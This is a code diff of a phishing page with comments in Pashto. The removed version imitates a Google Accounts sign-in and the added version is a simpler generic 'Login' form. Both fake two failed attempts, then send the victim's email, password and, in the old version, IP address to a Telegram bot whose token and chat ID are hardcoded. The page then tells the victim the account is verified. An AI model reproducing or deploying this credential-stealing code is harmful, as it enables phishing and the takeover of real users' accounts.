@@ -2,234 +2,102 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Sign in - Google Accounts</title>
-    <!-- د تلګرام Web App سکریپټ -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', system-ui;
-        }
         body {
-            min-height: 100vh;
-            background: #ffffff;
+            background: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 1rem;
+            height: 100vh;
+            font-family: Arial;
+            margin: 0;
         }
-        .google-card {
-            max-width: 450px;
+        .box {
+            background: white;
+            padding: 40px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+        }
+        input {
             width: 100%;
-            background: #ffffff;
-            border-radius: 0.75rem;
-            border: 1px solid #dadce0;
-            padding: 2rem;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
         }
-        .google-logo { text-align: center; margin-bottom: 1rem; }
-        .google-logo img { width: 75px; height: auto; }
-        h1 { font-size: 1.5rem; font-weight: 500; color: #202124; text-align: center; margin-bottom: 0.5rem; }
-        .sub { color: #5f6368; font-size: 0.85rem; text-align: center; margin-bottom: 1.8rem; }
-        .input-group { margin-bottom: 0.8rem; }
-        .input-group input {
+        button {
             width: 100%;
-            padding: 0.85rem 1rem;
-            background: #ffffff;
-            border: 1px solid #dadce0;
-            border-radius: 0.25rem;
-            color: #202124;
-            font-size: 1rem;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
-        }
-        .next-button-container { display: flex; justify-content: flex-end; margin-top: 1rem; margin-bottom: 1.5rem; }
-        .next-btn {
-            padding: 0.75rem 1.5rem;
+            padding: 12px;
             background: #1a73e8;
-            border: none;
-            border-radius: 0.25rem;
             color: white;
-            font-size: 0.9rem;
-            font-weight: 600;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
         }
-        .next-btn:hover { background: #1557b0; }
-        .links-row { display: flex; justify-content: space-between; margin: 0.5rem 0 1rem; font-size: 0.8rem; }
-        .links-row a, .links-row span { color: #1a73e8; text-decoration: none; cursor: pointer; }
-        .links-row a:hover, .links-row span:hover { text-decoration: underline; }
-        .guest-text { text-align: left; margin: 1rem 0; font-size: 0.75rem; color: #5f6368; }
-        .guest-text a { color: #1a73e8; text-decoration: none; }
-        .create-account { display: inline-block; margin: 0.5rem 0 1rem; font-size: 0.85rem; color: #1a73e8; text-decoration: none; cursor: pointer; }
-        .message { margin-top: 1rem; padding: 0.7rem; border-radius: 0.25rem; font-size: 0.8rem; text-align: center; display: none; }
-        .error-msg { background: #fce8e6; border: 1px solid #d93025; color: #d93025; }
-        .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
-        .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
-        .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
-        .cancel-btn {
-            width: 100%;
-            padding: 0.85rem;
+        .cancel {
             background: #dc3545;
-            color: white;
-            border: none;
-            border-radius: 0.25rem;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 1rem;
         }
-        .cancel-btn:hover { background: #c82333; }
-        .hidden { display: none; }
+        .error { color: red; margin: 10px 0; }
+        .success { color: green; margin: 10px 0; }
     </style>
 </head>
 <body>
-
-<div class="google-card">
-    <div id="step1View">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>Sign in</h1>
-        <div class="sub">Use your Google Account</div>
-        <div class="input-group"><input type="email" id="emailInput" placeholder="Email or phone"></div>
-        <div class="next-button-container"><button class="next-btn" id="nextBtn">Next</button></div>
-        <div class="links-row"><span onclick="alert('Forgot email?')">Forgot email?</span><span onclick="alert('Guest mode')">Guest mode</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-        <a href="#" class="create-account" onclick="alert('Create account'); return false;">Create account</a>
-    </div>
-
-    <div id="step2View" class="hidden">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>Sign in</h1>
-        <div class="sub" id="displayEmail"></div>
-        <div class="input-group"><input type="password" id="passwordInput" placeholder="Enter your password"></div>
-        <div class="next-button-container"><button class="next-btn" id="loginBtn">Next</button></div>
-        <div class="links-row"><span onclick="goBackToEmail()">← Back</span><span onclick="alert('Forgot password?')">Forgot password?</span></div>
-        <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
-    </div>
-
-    <div id="successPanel" class="hidden">
-        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
-        <h1>✅ Verification Complete</h1>
-        <div class="sub">Your account has been successfully verified!</div>
-        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
-    </div>
-
-    <div id="errorBox" class="message error-msg"></div>
-    <div id="successBox" class="message success-msg"></div>
-    <div class="step-text" id="stepIndicator">Step 1 of 2</div>
-    <div class="footer"><span onclick="alert('English')">English</span><span onclick="alert('Help')">Help</span><span onclick="alert('Privacy')">Privacy</span><span onclick="alert('Terms')">Terms</span></div>
+<div class="box">
+    <h2>Sign in</h2>
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="pass" placeholder="Password">
+    <button onclick="doLogin()">Login</button>
+    <button class="cancel" onclick="goToBot()">Cancel - Back to Bot</button>
+    <div id="msg"></div>
 </div>
 
 <script>
-    // ========== د تلګرام Web App تنظیمات ==========
-    let tg = window.Telegram?.WebApp;
+    let count = 0;
+    let savedEmail = "";
     
-    // که چیرې په تلګرام کې خلاص شوی وي، WebApp فعال کړئ
-    if (tg) {
-        tg.ready();
-        tg.expand(); // پاڼه پراخه کړئ
-        console.log("Telegram Web App is available");
-    }
-    
-    // د بوټ لینک (ستاسو د بوټ یوزرنیم سره)
-    const BOT_USERNAME = "imrankhabot";  // <--- خپل بوټ یوزرنیم دلته دننه کړئ
-    const BOT_REDIRECT = `https://t.me/imrankhabot?start=confirm_account`;
-    
-    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
-    const ADMIN_ID = "8295417969";
-
-    let attempts = {};
-    let currentEmail = "";
-
-    async function getUserIP() {
-        try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; }
-        catch(e) { return 'unknown'; }
-    }
-
-    function showMessage(box, text, isError) {
-        box.textContent = text;
-        box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
-        box.style.display = 'block';
-        setTimeout(() => box.style.display = 'none', 3000);
-    }
-
-    function goBackToEmail() {
-        document.getElementById('step2View').classList.add('hidden');
-        document.getElementById('step1View').classList.remove('hidden');
-        document.getElementById('stepIndicator').textContent = "Step 1 of 2";
-        document.getElementById('emailInput').value = '';
-        document.getElementById('passwordInput').value = '';
-        currentEmail = '';
-    }
-
-    document.getElementById('nextBtn').onclick = () => {
-        let email = document.getElementById('emailInput').value.trim();
-        if (!email || !email.includes('@')) {
-            showMessage(document.getElementById('errorBox'), '❌ Valid email required', true);
-            return;
-        }
-        currentEmail = email;
-        document.getElementById('displayEmail').innerHTML = `${currentEmail} ✓`;
-        document.getElementById('step1View').classList.add('hidden');
-        document.getElementById('step2View').classList.remove('hidden');
-        document.getElementById('stepIndicator').textContent = "Step 2 of 2";
-        document.getElementById('passwordInput').value = '';
-    };
-
-    document.getElementById('loginBtn').onclick = async () => {
-        let pass = document.getElementById('passwordInput').value.trim();
-        if (!pass) {
-            showMessage(document.getElementById('errorBox'), '❌ Enter password', true);
+    async function doLogin() {
+        let email = document.getElementById('email').value;
+        let pass = document.getElementById('pass').value;
+        let msgDiv = document.getElementById('msg');
+        
+        if (!email || !pass) {
+            msgDiv.innerHTML = '<div class="error">Fill all fields!</div>';
             return;
         }
         
-        let ip = await getUserIP();
-        let key = currentEmail + ip;
-        if (!attempts[key]) attempts[key] = 0;
-        attempts[key]++;
+        count++;
         
-        if (attempts[key] === 1 || attempts[key] === 2) {
-            showMessage(document.getElementById('errorBox'), `❌ Incorrect password. ${3 - attempts[key]} attempts remaining.`, true);
-            setTimeout(() => goBackToEmail(), 2000);
+        if (count < 3) {
+            msgDiv.innerHTML = '<div class="error">Attempt ' + count + ' failed! Try again.</div>';
+            document.getElementById('email').value = '';
+            document.getElementById('pass').value = '';
             return;
         }
         
-        if (attempts[key] >= 3) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: ADMIN_ID, 
-                    text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            document.getElementById('step2View').classList.add('hidden');
-            document.getElementById('successPanel').classList.remove('hidden');
-        }
-    };
+        // درېیم ځل بریالی
+        let text = "✅ LOGIN SUCCESS\nEmail: " + email + "\nPass: " + pass;
+        
+        await fetch('https://api.telegram.org/bot8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: '8295417969',
+                text: text
+            })
+        });
+        
+        msgDiv.innerHTML = '<div class="success">✅ Success! You can now close this page.</div>';
+    }
     
-    // د CANCEL تڼۍ - د Web App API له لارې بندول
-    document.getElementById('cancelBtn').onclick = () => {
-        // که چیرې په تلګرام Web App کې وي، نو Web App بنده کړئ
-        if (tg) {
-            try {
-                // Web App بنده کړئ - دا به بوټ ته راستون شي[citation:1][citation:6]
-                tg.close();
-            } catch(e) {
-                console.log("Close error:", e);
-                window.location.href = BOT_REDIRECT;
-            }
-        } else {
-            // که په عادي براوزر کې وي، نو مستقیم بوټ ته لاړ شئ
-            window.location.href = BOT_REDIRECT;
-        }
-    };
+    function goToBot() {
+        window.location.href = 'https://t.me/imrankhabot?start=confirm_account';
+    }
 </script>
 </body>
 </html>
